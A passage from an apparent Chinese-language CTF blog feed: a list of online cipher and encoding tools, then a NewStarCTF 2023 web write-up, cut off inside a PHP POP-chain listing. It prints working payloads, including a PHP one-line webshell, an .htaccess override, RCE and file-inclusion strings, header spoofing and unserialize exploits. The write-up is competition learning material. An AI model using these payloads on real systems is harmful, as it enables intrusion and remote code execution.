id="Rabbit解密"><a href="#Rabbit解密" class="headerlink" title="Rabbit解密"></a>Rabbit解密</h2><p><a href="https://www.sojson.com/encrypt_rabbit.html">在线Rabbit加密 | Rabbit解密- 在线工具 (sojson.com)</a></p><h2 id="凯撒在线加解密"><a href="#凯撒在线加解密" class="headerlink" title="凯撒在线加解密"></a>凯撒在线加解密</h2><p>凯撒为什么叫凯撒？3</p><p><a href="http://www.hiencode.com/caesar.html">CTF在线工具-在线凯撒密码加密|在线凯撒密码解密|凯撒密码算法|Caesar Cipher (hiencode.com)</a></p><h2 id="单表替换"><a href="#单表替换" class="headerlink" title="单表替换"></a>单表替换</h2><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs makefile"><span class="hljs-section">例子:</span><br><span class="hljs-section">密文:MTHJ&#123;CUBCGXGUGXWREXIPOYAOEYFIGXWRXCHTKHFCOHCFDUCGTXZOHIXOEOWMEHZO&#125;</span><br>网站操作 输入密文，输入MTHJ=FLAG，直接梭哈<br></code></pre></td></tr></table></figure><p><a href="https://www.quipqiup.com/">quipqiup - cryptoquip and cryptogram solver</a></p><h2 id="猪圈密码"><a href="#猪圈密码" class="headerlink" title="猪圈密码"></a>猪圈密码</h2><img src="/2023/10/05/crypto/image-20231129213625631.png" class title="image-20231129213625631"><h2 id="猪圈密码变种"><a href="#猪圈密码变种" class="headerlink" title="猪圈密码变种"></a>猪圈密码变种</h2><img src="/2023/10/05/crypto/image-20231204220841259.png" class title="image-20231204220841259"><h2 id="中文电码解码"><a href="#中文电码解码" class="headerlink" title="中文电码解码"></a>中文电码解码</h2><p><a href="https://www.usetoolbar.com/convert/cccn.html">中文电码转换 - 在线工具栏 (usetoolbar.com)</a></p><p><a href="http://code.mcdvisa.com/">中文电码查询 Chinese Commercial Code - 标准电报码免费在线查询|姓名电码|美国签证电码 (mcdvisa.com)</a></p><h2 id="可能的替换式密码"><a href="#可能的替换式密码" class="headerlink" title="可能的替换式密码"></a>可能的替换式密码</h2><img src="/2023/10/05/crypto/image-20231129214324191.png" class title="image-20231129214324191"><h2 id="盲文解密"><a href="#盲文解密" class="headerlink" title="盲文解密"></a>盲文解密</h2><p><a href="http://www.atoolbox.net/Tool.php?Id=837">盲文点字加密&#x2F;解密 - 一个工具箱 - 好用的在线工具都在这里！ (atoolbox.net)</a></p><h2 id="标准银河字母"><a href="#标准银河字母" class="headerlink" title="标准银河字母"></a>标准银河字母</h2><img src="/2023/10/05/crypto/image-20231129214605071.png" class title="image-20231129214605071"><h2 id="跳舞的小人"><a href="#跳舞的小人" class="headerlink" title="跳舞的小人"></a>跳舞的小人</h2><img src="/2023/10/05/crypto/image-20231129214714397.png" class title="image-20231129214714397"><h2 id="圣堂武士密码"><a href="#圣堂武士密码" class="headerlink" title="圣堂武士密码"></a>圣堂武士密码</h2><img src="/2023/10/05/crypto/image-20231129214744926.png" class title="image-20231129214744926"><h2 id="埃特巴什码"><a href="#埃特巴什码" class="headerlink" title="埃特巴什码"></a>埃特巴什码</h2><img src="/2023/10/05/crypto/image-20231129215336616.png" class title="image-20231129215336616"><h2 id="曼彻斯特编码"><a href="#曼彻斯特编码" class="headerlink" title="曼彻斯特编码"></a>曼彻斯特编码</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># exp如下：</span><br>cipher=<span class="hljs-string">&#x27;5555555595555A65556AA696AA6666666955&#x27;</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">iee</span>(<span class="hljs-params">cipher</span>):<br>    tmp=<span class="hljs-string">&#x27;&#x27;</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(cipher)):<br>        a=<span class="hljs-built_in">bin</span>(<span class="hljs-built_in">eval</span>(<span class="hljs-string">&#x27;0x&#x27;</span>+cipher[i]))[<span class="hljs-number">2</span>:].zfill(<span class="hljs-number">4</span>)<br>        tmp=tmp+a[<span class="hljs-number">1</span>]+a[<span class="hljs-number">3</span>]<br>        <span class="hljs-built_in">print</span>(tmp)<br>    plain=[<span class="hljs-built_in">hex</span>(<span class="hljs-built_in">int</span>(tmp[i:i+<span class="hljs-number">8</span>][::-<span class="hljs-number">1</span>],<span class="hljs-number">2</span>))[<span class="hljs-number">2</span>:] <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-built_in">len</span>(tmp),<span class="hljs-number">8</span>)]<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;&#x27;</span>.join(plain).upper())<br><br>iee(cipher)<br>cipher=<span class="hljs-string">&#x27;5555555595555A65556AA696AA6666666955&#x27;</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">iee</span>(<span class="hljs-params">cipher</span>):<br>    tmp=<span class="hljs-string">&#x27;&#x27;</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(cipher)):<br>        a=<span class="hljs-built_in">bin</span>(<span class="hljs-built_in">eval</span>(<span class="hljs-string">&#x27;0x&#x27;</span>+cipher[i]))[<span class="hljs-number">2</span>:].zfill(<span class="hljs-number">4</span>)<br>        tmp=tmp+a[<span class="hljs-number">1</span>]+a[<span class="hljs-number">3</span>]<br>        <span class="hljs-built_in">print</span>(tmp)<br>    plain=[<span class="hljs-built_in">hex</span>(<span class="hljs-built_in">int</span>(tmp[i:i+<span class="hljs-number">8</span>][::-<span class="hljs-number">1</span>],<span class="hljs-number">2</span>))[<span class="hljs-number">2</span>:] <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-built_in">len</span>(tmp),<span class="hljs-number">8</span>)]<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;&#x27;</span>.join(plain).upper())<br><br>iee(cipher)<br></code></pre></td></tr></table></figure><h2 id="新约佛论禅"><a href="#新约佛论禅" class="headerlink" title="新约佛论禅"></a>新约佛论禅</h2><p><a href="http://hi.pcmoe.net/Buddha.html">新约佛论禅&#x2F;佛曰加密 - PcMoe!</a></p><h2 id="社会主义核心价值观"><a href="#社会主义核心价值观" class="headerlink" title="社会主义核心价值观"></a>社会主义核心价值观</h2><p><a href="https://www.zaixianjisuan.com/jiamijiemi/shehuizhuyihexinjiazhiguanjiami.html">社会主义核心价值观加密计算器 - 在线计算网 (zaixianjisuan.com)</a></p><h2 id="jsfuck"><a href="#jsfuck" class="headerlink" title="jsfuck"></a>jsfuck</h2><p><a href="https://www.bugku.com/tools/jsfuck/#">JSFuck - 在线加解密 (bugku.com)</a></p><h2 id="brainfuck"><a href="#brainfuck" class="headerlink" title="brainfuck"></a>brainfuck</h2><p>普通brainfuck:</p><p><a href="http://www.hiencode.com/brain.html">CTF在线工具-在线Brainfuck加密|在线Brainfuck解密|Brainfuck|Brainfuck原理|Brainfuck算法 (hiencode.com)</a></p><p>藏在内存区的brainfuck:</p><p><a href="https://pablojorge.github.io/brainfuck/">pablojorge.github.io&#x2F;brainfuck&#x2F;</a></p><h2 id="在线分解质因数计算器工具"><a href="#在线分解质因数计算器工具" class="headerlink" title="在线分解质因数计算器工具"></a>在线分解质因数计算器工具</h2><p><a href="http://tools.jb51.net/jisuanqi/factor_calc">在线分解质因数计算器工具 - 在线计算器 - 脚本之家在线工具 (jb51.net)</a></p><h2 id="查询MD5"><a href="#查询MD5" class="headerlink" title="查询MD5"></a>查询MD5</h2><p><a href="https://www.cmd5.com/">md5在线解密破解,md5解密加密 (cmd5.com)</a></p><p><a href="https://www.somd5.com/">MD5免费在线解密破解_MD5在线加密-SOMD5</a></p><h2 id="quipqiup暴力破解"><a href="#quipqiup暴力破解" class="headerlink" title="quipqiup暴力破解"></a>quipqiup暴力破解</h2><p><a href="http://quipqiup.com/">quipqiup - cryptoquip and cryptogram solver</a></p><h2 id="普莱费尔密码解密"><a href="#普莱费尔密码解密" class="headerlink" title="普莱费尔密码解密"></a>普莱费尔密码解密</h2><p>常与playfair联系，或者是<strong>公平地玩</strong>，密钥没给的话还可能是playfair</p><p><a href="http://www.atoolbox.net/Tool.php?Id=912">普莱费尔密码加密&#x2F;解密 - 一个工具箱 - 好用的在线工具都在这里！ (atoolbox.net)</a></p><h2 id="埃及文字"><a href="#埃及文字" class="headerlink" title="埃及文字"></a>埃及文字</h2><img src="/2023/10/05/crypto/image-20231204220025623.png" class title="image-20231204220025623"><h2 id="宝可梦图腾"><a href="#宝可梦图腾" class="headerlink" title="宝可梦图腾"></a>宝可梦图腾</h2><img src="/2023/10/05/crypto/image-20231204220100577.png" class title="image-20231204220100577"><h2 id="精灵语"><a href="#精灵语" class="headerlink" title="精灵语"></a>精灵语</h2><img src="/2023/10/05/crypto/image-20231204220141331.png" class title="image-20231204220141331"><h2 id="曲折密码-x2F-夏多密码"><a href="#曲折密码-x2F-夏多密码" class="headerlink" title="曲折密码&#x2F;夏多密码"></a>曲折密码&#x2F;夏多密码</h2><img src="/2023/10/05/crypto/image-20231204220533944.png" class title="image-20231204220533944"><h2 id="外星人密码"><a href="#外星人密码" class="headerlink" title="外星人密码"></a>外星人密码</h2><img src="/2023/10/05/crypto/image-20231204220610152.png" class title="image-20231204220610152"><h2 id="音乐密码"><a href="#音乐密码" class="headerlink" title="音乐密码"></a>音乐密码</h2><img src="/2023/10/05/crypto/image-20231204220736819.png" class title="image-20231204220736819"><h2 id="斐波那契移位替换"><a href="#斐波那契移位替换" class="headerlink" title="斐波那契移位替换"></a>斐波那契移位替换</h2><p>对照原表</p><h2 id="九宫格键盘解密"><a href="#九宫格键盘解密" class="headerlink" title="九宫格键盘解密"></a>九宫格键盘解密</h2><p>crypto工具</p><h2 id="维吉尼亚密码"><a href="#维吉尼亚密码" class="headerlink" title="维吉尼亚密码"></a>维吉尼亚密码</h2><p>暴力: <a href="https://guballa.de/vigenere-solver">Vigenere Solver | guballa.de</a></p><p>有密钥: </p><p><a href="http://www.atoolbox.net/Tool.php?Id=856">维吉尼亚密码加密&#x2F;解密 - 一个工具箱 - 好用的在线工具都在这里！ (atoolbox.net)</a></p><p><a href="https://www.qqxiuzi.cn/bianma/weijiniyamima.php">维吉尼亚密码在线加密解密 - 千千秀字 (qqxiuzi.cn)</a></p><h2 id="AES加密"><a href="#AES加密" class="headerlink" title="AES加密"></a>AES加密</h2><p><a href="https://tool.lmeee.com/jiami/aes">在线AES加密解密 - 拉米工具 (lmeee.com)</a></p>]]></content>
    
    
    <categories>
      
      <category>crypto</category>
      
    </categories>
    
    
    <tags>
      
      <tag>crypto</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>2023NewStarCTF</title>
    <link href="/2023/09/29/NewStarCTF_web_WP/"/>
    <url>/2023/09/29/NewStarCTF_web_WP/</url>
    
    <content type="html"><![CDATA[<h1 id="NewStarCTF-2023"><a href="#NewStarCTF-2023" class="headerlink" title="NewStarCTF_2023"></a>NewStarCTF_2023</h1><h2 id="WEEK1"><a href="#WEEK1" class="headerlink" title="WEEK1"></a>WEEK1</h2><h3 id="web-泄露的秘密"><a href="#web-泄露的秘密" class="headerlink" title="web-泄露的秘密"></a>web-泄露的秘密</h3><p><a href="http://www.zip/">www.zip</a></p><p>robots.txt</p><h3 id="web-begin-of-upload"><a href="#web-begin-of-upload" class="headerlink" title="web-begin of upload"></a>web-begin of upload</h3><p>写一句话木马，上传，抓包，改成php，蚁剑连接即可</p><h3 id="web-begin-of-http"><a href="#web-begin-of-http" class="headerlink" title="web-begin of http"></a>web-begin of http</h3><p>get,post,UA,cookie,referer</p><p>伪造IP</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">X</span>-Forwarded-For:<span class="hljs-number">127.0.0.1</span><br><span class="hljs-attribute">Client</span>-ip:<span class="hljs-number">127.0.0.1</span><br><span class="hljs-attribute">X</span>-Client-IP:<span class="hljs-number">127.0.0.1</span><br><span class="hljs-attribute">X</span>-Remote-IP:<span class="hljs-number">127.0.0.1</span><br><span class="hljs-attribute">X</span>-Rriginating-IP:<span class="hljs-number">127.0.0.1</span><br><span class="hljs-attribute">X</span>-Remote-addr:<span class="hljs-number">127.0.0.1</span><br><span class="hljs-attribute">HTTP_CLIENT_IP</span>:<span class="hljs-number">127.0.0.1</span><br><span class="hljs-attribute">X</span>-Real-IP:<span class="hljs-number">127.0.0.1</span><br><span class="hljs-attribute">X</span>-Originating-IP:<span class="hljs-number">127.0.0.1</span><br><span class="hljs-attribute">via</span>:<span class="hljs-number">127.0.0.1</span><br></code></pre></td></tr></table></figure><h3 id="web-begin-of-php"><a href="#web-begin-of-php" class="headerlink" title="web-begin of php"></a>web-begin of php</h3><p>第一层</p><p>0e绕过</p><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs dns">QNKCDZO<br><span class="hljs-number">240610708</span><br>s878926199a<br>s155964671a<br>s214587387a<br>s214587387a<br><br>这些字符串的 md5 值都是 <span class="hljs-number">0</span>e 开头，在 php 弱类型比较中判断为相等<br></code></pre></td></tr></table></figure><p>第二层</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">对于php强比较和弱比较：md5()，sha1()函数无法处理数组，如果传入的为数组，会返回<span class="hljs-keyword">NULL</span>，所以两个数组经过加密后得到的都是<span class="hljs-keyword">NULL</span>，也就是相等的<br><br>所以传一个数组形式即可，key3[]=<span class="hljs-number">3</span><br></code></pre></td></tr></table></figure><p>第三层</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs abnf">利用strcmp函数特点尝试使用数组绕过。令key4[]<span class="hljs-operator">=</span>xxx。<br></code></pre></td></tr></table></figure><p>第四层</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs abnf">key5[]<span class="hljs-operator">=</span><span class="hljs-number">2024</span>ikun<br></code></pre></td></tr></table></figure><p>第五层</p><p>基本全是数组绕过()</p><h3 id="web-easylogin"><a href="#web-easylogin" class="headerlink" title="web-easylogin"></a>web-easylogin</h3><p>进去之后，先是简单的密码爆破</p><p>然后进去一脸懵，翻了文件目录，也没翻到flag</p><p>最后在thai师傅的提示下，看了</p><p>burp-Proxy-http history，在某个记录里，发现了flag</p><p>一些反思：登陆成功后，跳转了挺长时间，所以应该藏着其他界面，所以应该抓包发现，看看有无神奇的地方</p><h3 id="web-errorflask"><a href="#web-errorflask" class="headerlink" title="web-errorflask"></a>web-errorflask</h3><p>一开始看到flask，以为是SSTI注入，没想到题如其名</p><p><strong>error</strong></p><p>一开始还在尝试SSTI注入，发现报错，</p><p>翻一下报错，没想到直接翻到flag了，hh</p><h3 id="web-R-C-E"><a href="#web-R-C-E" class="headerlink" title="web-R!C!E!"></a>web-R!C!E!</h3><p>爆破password，exp如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> hashlib<br><br>target_prefix = <span class="hljs-string">&quot;c4d038&quot;</span><br>found_string = <span class="hljs-literal">None</span><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1000000</span>):<br>    string = <span class="hljs-built_in">str</span>(i).encode()  <span class="hljs-comment"># 将数字转换为字符串并编码为字节串</span><br>    md5_hash = hashlib.md5(string).hexdigest()  <span class="hljs-comment"># 计算MD5哈希值并转换为十六进制字符串</span><br><br>    <span class="hljs-keyword">if</span> md5_hash[:<span class="hljs-number">6</span>] == target_prefix:<br>        found_string = string.decode()  <span class="hljs-comment"># 将字节串解码为字符串</span><br>        <span class="hljs-keyword">break</span><br><br><span class="hljs-keyword">if</span> found_string:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;找到匹配的字符串:&quot;</span>, found_string)<br><span class="hljs-keyword">else</span>:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;未找到匹配的字符串&quot;</span>)<br><br></code></pre></td></tr></table></figure><figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs autohotkey">绕过system<br><br>echo `此处为命令`;<br>?&gt;&lt;?=`此处为命令`;<br></code></pre></td></tr></table></figure><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs routeros">在php中变量名只有数字字母下划线，被get或者post传入的变量名，如果含有空格、+、[则会被转化为_，所以按理来说我们构造不出e_v.a.l这个变量(因为含有.)，但php中有个特性就是如果传入[，它被转化为_之后，后面的字符就会被保留下来不会被替换<br><br>所以构造payload<br><span class="hljs-attribute">password</span>=114514&amp;e[v.a.<span class="hljs-attribute">l</span>=echo `tac /f*`;<br><br>附:<br>拼接可绕过，另解<br><span class="hljs-attribute">password</span>=114514&amp;e[v.a.<span class="hljs-attribute">l</span>=echo `l<span class="hljs-string">&#x27;&#x27;</span>s /`;<br>回显: bin boot dev etc flag home lib lib64 media mnt opt proc root <span class="hljs-built_in">run</span> sbin srv start.sh sys tmp usr var <br>然后再<span class="hljs-attribute">password</span>=114514&amp;e[v.a.<span class="hljs-attribute">l</span>=echo `c<span class="hljs-string">&#x27;&#x27;</span>at /f<span class="hljs-string">&#x27;&#x27;</span>lag`;<br>也可读取flag<br><br><br><br></code></pre></td></tr></table></figure><h2 id="WEEK2"><a href="#WEEK2" class="headerlink" title="WEEK2"></a>WEEK2</h2><h3 id="web-游戏高手"><a href="#web-游戏高手" class="headerlink" title="web-游戏高手"></a>web-游戏高手</h3><p>js分析+post</p><h3 id="web-ez-sql"><a href="#web-ez-sql" class="headerlink" title="web-ez_sql"></a>web-ez_sql</h3><p>直接sqlmap梭哈了</p><h3 id="web-include-0-0"><a href="#web-include-0-0" class="headerlink" title="web-include 0.0"></a>web-include 0.0</h3><p>文件包含</p><p>用的这个payload</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">file_include<br>?filename=php:<span class="hljs-regexp">//</span>filter<span class="hljs-regexp">//</span>convert.iconv.SJIS*.UCS-<span class="hljs-number">4</span>*/resource=flag.php<br></code></pre></td></tr></table></figure><h3 id="web-rce"><a href="#web-rce" class="headerlink" title="web-rce"></a>web-rce</h3><p>git泄露+无参数RCE</p><figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs autoit">?star=<span class="hljs-built_in">eval</span>(<span class="hljs-keyword">next</span>(getallheaders()))<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure><p>最终payload</p><p>然后要改UA，为什么呢，因为是next</p><h3 id="web-Unserialize"><a href="#web-Unserialize" class="headerlink" title="web-Unserialize?"></a>web-Unserialize?</h3><p>exp如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">evil</span> </span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$cmd</span>=<span class="hljs-string">&quot;head /th*&quot;</span>;<br>&#125;<br><br><span class="hljs-variable">$kun</span>=<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">evil</span>();<br><br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">urlencode</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$kun</span>));<br><span class="hljs-meta">?&gt;</span> <br></code></pre></td></tr></table></figure><p>一个很奇怪的点，不要写construct，直接赋值就好了</p><p>然后传就好了</p><h3 id="web-Upload"><a href="#web-Upload" class="headerlink" title="web-Upload"></a>web-Upload</h3><p>上传图片改后缀行不通</p><p>上传.htaccess文件(<strong>文件名就是.htaccess</strong>)</p><p>内容为</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-section">&lt;FilesMatch <span class="hljs-string">&quot;kun.png&quot;</span>&gt;</span><br><span class="hljs-attribute">SetHandler</span> application/x-httpd-php<br><span class="hljs-section">&lt;/FilesMatch&gt;</span><br><br></code></pre></td></tr></table></figure><p>然后上传图片马，因内容被过滤，于是采用以下payload</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">language</span>=<span class="hljs-string">&quot;php&quot;</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript"><span class="hljs-built_in">eval</span>($_POST[<span class="hljs-string">&#x27;ikun&#x27;</span>]);</span><br><span class="language-javascript"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure><p>然后蚁剑连上即可</p><h2 id="WEEK3"><a href="#WEEK3" class="headerlink" title="WEEK3"></a>WEEK3</h2><h3 id="web-pop链-学习"><a href="#web-pop链-学习" class="headerlink" title="web-pop链(学习)"></a>web-pop链(学习)</h3><p>一些魔术方法</p><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs scss"><span class="hljs-built_in">__construct</span>()：创建对象时触发<br><span class="hljs-built_in">__destruct</span>() ：对象被销毁时触发<br><span class="hljs-built_in">__sleep</span>() ：在对象被序列化的过程中自动调用，且发生在序列化之前<br><span class="hljs-built_in">__wakeup</span>()： 该魔术方法在反序列化的时候自动调用，且发生在反序列化之前　<br><span class="hljs-built_in">__get</span>() ：用于从不可访问或不存在的属性读取数据<br><span class="hljs-built_in">__set</span>() ：用于将数据写入不可访问或不存在的属性<br><span class="hljs-built_in">__call</span>() ：在对象上下文中调用不可访问的方法时触发<br><span class="hljs-built_in">__callStatic</span>() ：在静态上下文中调用不可访问的方法时触发<br><span class="hljs-built_in">__toString</span>()：在对象当做字符串的时候会被调用。<br><span class="hljs-built_in">__invoke</span>() ：当尝试将对象调用为函数时触发<br><br><span class="hljs-built_in">__isset</span>()：当对不可访问属性调用<span class="hljs-built_in">isset</span>()或<span class="hljs-built_in">empty</span>()时调用<br><span class="hljs-built_in">__unset</span>()：当对不可访问属性调用<span class="hljs-built_in">unset</span>()时被调用。<br><span class="hljs-built_in">__set_state</span>()：调用<span class="hljs-built_in">var_export</span>()导出类时，此静态方法会被调用。<br><span class="hljs-built_in">__clone</span>()：当对象复制完成时调用<br><span class="hljs-built_in">__unset</span>() ：在不可访问的属性上使用<span class="hljs-built_in">unset</span>()时触发<br></code></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Begin</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$name</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/[a-zA-Z0-9]/&quot;</span>,<span class="hljs-variable">$this</span>-&gt;name))&#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Hello&quot;</span>;<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Welcome to NewStarCTF 2023!&quot;</span>;<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Then</span></span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$func</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        (<span class="hljs-variable language_">$this</span>-&gt;func)();<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Good Job!&quot;</span>;<br>    &#125;<br><br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Handle</span></span>&#123;<br>    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$obj</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__call</span>(<span class="hljs-params"><span class="hljs-variable">$func</span>, <span class="hljs-variable">$vars</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;obj-&gt;<span class="hljs-title function_ invoke__">end</span>();<br>    &#125;<br><br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Super</span></span>&#123;<br>    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$obj</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__invoke</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;obj-&gt;<span class="hljs-title function_ invoke__">getStr</span>();<br>    